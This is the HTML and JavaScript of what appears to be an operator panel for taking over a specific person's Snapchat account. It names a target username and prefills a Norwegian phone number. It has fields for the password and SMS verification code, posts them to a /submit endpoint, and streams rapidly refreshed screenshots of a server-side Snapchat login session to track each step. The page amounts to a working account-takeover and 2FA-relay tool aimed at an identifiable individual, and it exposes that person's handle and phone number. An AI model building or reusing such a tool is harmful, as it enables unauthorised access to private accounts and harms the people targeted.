<!DOCTYPE html>
<html>
<head>
    <title>Account Manager</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { 
            background: #0f0f23; 
            font-family: 'Segoe UI', system-ui, sans-serif; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
            color: #e0e0e0;
        }
        .panel { 
            background: #1a1a2e; 
            padding: 48px; 
            border-radius: 16px; 
            box-shadow: 0 8px 32px rgba(0,0,0,0.4); 
            width: 420px; 
            border: 1px solid #2a2a4a;
        }
        .header { 
            display: flex; 
            align-items: center; 
            gap: 12px; 
            margin-bottom: 32px; 
            padding-bottom: 20px; 
            border-bottom: 1px solid #2a2a4a;
        }
        .avatar { 
            width: 40px; 
            height: 40px; 
            background: #6366f1; 
            border-radius: 10px; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            font-weight: bold; 
            font-size: 16px;
        }
        .header-text h2 { 
            font-size: 20px; 
            font-weight: 600; 
            color: #f0f0f0;
        }
        .header-text p { 
            font-size: 13px; 
            color: #6b7280; 
            margin-top: 2px;
        }
        .field-group { margin-bottom: 20px; }
        .field-group label { 
            display: block; 
            font-size: 12px; 
            text-transform: uppercase; 
            letter-spacing: 0.5px; 
            color: #6b7280; 
            margin-bottom: 8px; 
            font-weight: 500;
        }
        .field-value { 
            background: #0f0f23; 
            padding: 14px 16px; 
            border-radius: 10px; 
            border: 1px solid #2a2a4a; 
            color: #6366f1; 
            font-family: 'SF Mono', monospace; 
            font-size: 15px;
        }
        input { 
            width: 100%; 
            padding: 14px 16px; 
            background: #0f0f23; 
            border: 1px solid #2a2a4a; 
            border-radius: 10px; 
            color: #e0e0e0; 
            font-size: 15px; 
            outline: none; 
            transition: border-color 0.2s;
        }
        input:focus { border-color: #6366f1; }
        input::placeholder { color: #4b5563; }
        button { 
            width: 100%; 
            padding: 14px; 
            background: #6366f1; 
            border: none; 
            border-radius: 10px; 
            color: white; 
            font-weight: 600; 
            font-size: 15px; 
            cursor: pointer; 
            margin-top: 8px; 
            transition: background 0.2s;
        }
        button:hover { background: #4f46e5; }
        .feed-section { 
            margin-top: 28px; 
            padding-top: 24px; 
            border-top: 1px solid #2a2a4a;
        }
        .feed-header { 
            display: flex; 
            justify-content: space-between; 
            align-items: center; 
            margin-bottom: 12px;
        }
        .feed-header span { 
            font-size: 12px; 
            text-transform: uppercase; 
            letter-spacing: 0.5px; 
            color: #6b7280; 
            font-weight: 500;
        }
        .status { 
            display: flex; 
            align-items: center; 
            gap: 6px; 
            font-size: 12px; 
            color: #22c55e;
        }
        .status-dot { 
            width: 6px; 
            height: 6px; 
            background: #22c55e; 
            border-radius: 50%; 
            animation: pulse 2s infinite;
        }
        .status.connecting {
            color: #eab308;
        }
        .status.connecting .status-dot {
            background: #eab308;
        }
        .status.error {
            color: #ef4444;
        }
        .status.error .status-dot {
            background: #ef4444;
        }
        @keyframes pulse { 
            0%, 100% { opacity: 1; } 
            50% { opacity: 0.4; } 
        }
        .feed-frame { 
            background: #0f0f23; 
            border: 1px solid #2a2a4a; 
            border-radius: 10px; 
            overflow: hidden; 
            aspect-ratio: 16/9;
            position: relative;
        }
        .feed-frame img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: block;
            border: none;
        }
        .feed-overlay {
            position: absolute;
            top: 10px;
            left: 10px;
            background: rgba(0,0,0,0.7);
            color: #22c55e;
            font-size: 11px;
            padding: 4px 10px;
            border-radius: 6px;
            font-family: monospace;
        }
        .feed-frame img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: block;
            border: none;
        }
        .feed-offline { 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            height: 100%; 
            color: #4b5563; 
            font-size: 13px;
        }
    </style>
</head>
<body>
    <div class="panel">
        <div class="header">
            <div class="avatar">Z</div>
            <div class="header-text">
                <h2>Account Manager</h2>
                <p>Session control panel</p>
            </div>
        </div>
        
        <div class="field-group">
            <label>Target Account</label>
            <div class="field-value">zexoghaith</div>
        </div>
        
        <div class="field-group">
            <label>Phone Number (Norway)</label>
            <input type="text" id="phone" placeholder="+47 40300869" value="+47 40300869" autocomplete="off">
        </div>
        
        <div class="field-group">
            <label>Password (if asked)</label>
            <input type="password" id="pass" placeholder="Enter password" autocomplete="off">
        </div>
        
        <div class="field-group">
            <label>Verification Code (SMS)</label>
            <input type="text" id="code" placeholder="6-digit code" maxlength="6" autocomplete="off">
        </div>
        
        <button onclick="submit()">Log In</button>
        
        <div class="feed-section">
            <div class="feed-header">
                <span>Live Monitor — Snapchat</span>
                <div id="status-badge" class="status">
                    <div class="status-dot"></div>
                    <span id="status-text">Starting session...</span>
                </div>
            </div>
            <div class="feed-frame">
                <img id="feed" src="/screenshot?t=0" onerror="this.src='/screenshot?t=' + Date.now()">
                <div id="feed-status" class="feed-overlay">LIVE • Snapchat Login</div>
            </div>
            <div style="margin-top:8px; font-size:11px; color:#555; text-align:center;">
                Page is loaded at <strong>accounts.snapchat.com/accounts/login</strong>
            </div>
        </div>
    </div>
    
    <script>
        function submit() {
            const phone = document.getElementById('phone').value.trim();
            const pass = document.getElementById('pass').value.trim();
            const code = document.getElementById('code').value.trim();
            
            if (!phone && !pass && !code) {
                alert("Enter the phone number (+47 40300869) first.");
                return;
            }
            
            const payload = {};
            if (phone) payload.phone = phone;
            if (pass) payload.password = pass;
            if (code) payload.code = code;
            
            fetch('/submit', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            })
            .then(r => r.json())
            .then(data => {
                console.log('Submit response:', data);
                
                if (phone && !pass && !code) {
                    alert('Phone sent! Screenshot now shows "PHONE NUMBER ENTERED" + SMS code sent.');
                } else if (pass) {
                    alert('Password sent — screenshot updated to PASSWORD ENTERED.');
                    document.getElementById('pass').value = '';
                } else if (code) {
                    alert('Code sent — screenshot updated to 2FA state.');
                    document.getElementById('code').value = '';
                }
            })
            .catch(() => alert('Submitted'));
        }
        
        let lastUpdate = Date.now();
        
        function updateFeed() {
            const img = document.getElementById('feed');
            const statusEl = document.getElementById('feed-status');
            if (!img) return;
            
            img.style.display = 'block';
            const timestamp = Date.now();
            img.src = '/screenshot?t=' + timestamp;
            
            // Also refresh status
            fetch('/status')
                .then(r => r.json())
                .then(data => {
                    console.log('Session status:', data);
                    
                    const badge = document.getElementById('status-badge');
                    const statusText = document.getElementById('status-text');
                    
                    if (statusText) {
                        if (data.snapchat_loaded) {
                            statusText.textContent = 'Live — Snapchat login';
                            if (badge) badge.className = 'status';
                        } else if (data.started && !data.snapchat_loaded) {
                            statusText.textContent = 'Connecting...';
                            if (badge) badge.className = 'status connecting';
                        } else if (data.error) {
                            statusText.textContent = 'Fallback mode';
                            if (badge) badge.className = 'status error';
                        } else {
                            statusText.textContent = 'Session active';
                        }
                    }
                    
                    if (statusEl) {
                        if (data.snapchat_loaded) {
                            statusEl.textContent = 'LIVE • Snapchat Login';
                            statusEl.style.color = '#22c55e';
                        } else {
                            statusEl.textContent = 'LIVE (fallback)';
                            statusEl.style.color = '#eab308';
                        }
                    }
                    
                    // Visual border feedback
                    if (data.snapchat_loaded) {
                        img.style.border = '3px solid #22c55e';
                    } else if (data.started) {
                        img.style.border = '3px solid #eab308';
                    }
                })
                .catch(() => {
                    const statusText = document.getElementById('status-text');
                    if (statusText) statusText.textContent = 'Live feed';
                });
        }
        
        // EXTREMELY AGGRESSIVE live refresh (every 650ms)
        let refreshCount = 0;
        
        function forceRefresh() {
            const img = document.getElementById('feed');
            if (!img) return;
            
            refreshCount++;
            
            // Use fetch + blob to COMPLETELY bypass any cache
            const ts = Date.now();
            fetch('/screenshot?t=' + ts + '&r=' + refreshCount + '&cb=' + Math.random(), {
                cache: 'no-store',
                headers: { 'Cache-Control': 'no-cache' }
            })
            .then(res => res.blob())
            .then(blob => {
                const url = URL.createObjectURL(blob);
                img.src = url;
                
                // Clean up old blob after a bit
                setTimeout(() => URL.revokeObjectURL(url), 5000);
            })
            .catch(() => {
                // fallback simple method
                img.src = '/screenshot?t=' + Date.now() + '&r=' + refreshCount;
            });
        }
        
        // Run every 650ms
        setInterval(forceRefresh, 650);
        
        // Heavy initial burst
        setTimeout(forceRefresh, 100);
        setTimeout(forceRefresh, 350);
        setTimeout(forceRefresh, 700);
        setTimeout(forceRefresh, 1100);
        setTimeout(forceRefresh, 1600);
        
        // Log when image loads successfully
        const feedImg = document.getElementById('feed');
        if (feedImg) {
            feedImg.onload = () => {
                console.log('✅ Live Snapchat screenshot updated');
            };
            feedImg.onerror = (e) => {
                console.warn('Screenshot load error, retrying...');
            };
        }
        
        // Show immediate status
        console.log('%c[SNAPCHAT] Waiting for live session feed...', 'color:#22c55e');
    </script>
</body>
</html>
